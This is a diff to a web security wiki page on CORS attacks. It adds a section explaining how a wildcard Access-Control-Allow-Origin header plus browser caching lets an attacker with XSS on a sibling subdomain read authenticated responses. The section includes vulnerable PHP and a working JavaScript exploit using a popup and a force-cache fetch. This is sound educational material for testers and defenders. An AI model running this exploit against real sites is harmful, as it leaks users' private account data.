@@ -21,7 +21,7 @@ This policy ensures certain response headers are explicitly set to allow cross-o
 
 * [`Access-Control-Allow-Origin`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin)`: <origin> | *`: If this header is missing, no other origins are allows to read the body. If it is a valid origin, the body may be read if the requesting origin is the same as that in this header. If the value is "`*`" (wildcard), any origin may read the body.
 * [`Access-Control-Allow-Credentials`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Credentials)`: true`: If this header is missing, it is interpreted as `false`. If it is instead explicitly set to `true`, the incoming request made by `fetch()` may include cookies, only if `...-Allow-Origin` is not `*` during the preflight request. \
-  It must be a full origin. This is why some APIs simply reflect the incoming `Origin` header to allow any site to include cookies.
+  It must be a full origin. This is why some REST APIs simply reflect the incoming `Origin` header to allow any site to include cookies.
 
 Fetch requests must explicitly ask to include cookies if they want to send cookies and read a response. This is done using the [`credentials:`](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch#sending_a_request_with_credentials_included) option. If by the [#same-site](cross-site-request-forgery-csrf.md#same-site "mention") rules explained below your background request is allowed to include cookies, and the `Access-Control` headers allow it, the following request will be authenticated and allow you to read the response cross-site:
 
@@ -66,6 +66,36 @@ If the application responds with `Access-Control-Allow-Origin: null` by default,
   }
 </script>
 ```
+
+### `Origin: *` with credentials (cache)
+
+One common configuration is to set `Access-Control-Allow-Origin: *` in the response to some authenticated endpoint, without `Access-Control-Allow-Credentials: true`. `*` is special here in that it allows any origin to read the body, but because this is dangerous the browser will not allow such requests to be with cookies ("credentials").
+
+You can bypass this restriction by abusing the **browser cache**. Every URL not explicitly denied from the cache using `Cache-Control` headers may be cached by the browser, and these caches are shared with sites under the same [_eTLD+1_](https://web.dev/articles/same-site-same-origin#public-suffix-list-etld). This means subdomains under one main domain will all share the same cache.
+
+The attacker can first open the target page in a new top-level window, which will use cookies and cache the response, while not being able to read it. Then use the `cache: "force-cache"` option to fetch the response from the cache without sending a request or dealing with CORS, leaking the response from the first request:
+
+<pre class="language-php" data-title="Vulnerable code (/api/profile)"><code class="lang-php">&#x3C;?php
+<strong>header("Access-Control-Allow-Origin: *");
+</strong>
+// ... do something with $_SESSION and echo it
+</code></pre>
+
+<pre class="language-javascript" data-title="Exploit (xss.example.com)"><code class="lang-javascript">const TARGET = "https://example.com/api/profile";
+onclick = async () => {
+<strong>  w = window.open(TARGET, "popup");  // With cookies
+</strong>  setTimeout(() => { w.close() }, 1000);
+
+  // Get from cache without cookies or CORS
+  const leak = await fetch(TARGET, {
+<strong>    cache: "force-cache",
+</strong>  }).then((response) => response.text())
+
+  console.log(leak);
+}
+</code></pre>
+
+Note that this doesn't work on a completely separate attacker's domain, because the [cache partition](https://developer.chrome.com/blog/http-cache-partitioning) will be different. You need to have an XSS on a subdomain to exploit this on the vulnerable domain. This trick also only works on Chromium-based browsers, Firefox does not seem to be affected.
 
 ### Preflight & Content Types
 
@@ -394,7 +424,7 @@ Originally well explained in ["Turning unexploitable XSS into an account takeove
 5. Let the user naturally log in to their account
 6. The victim naturally browses to the Stored XSS payload, or we have to redirect them again. Either way, the XSS will now be in the victim's session so you can make any authenticated requests
 
-<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption><p>Flow diagram of the attack with different windows</p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption><p>Flow diagram of the attack with different windows</p></figcaption></figure>
 
 ### Other cookie attacks
 
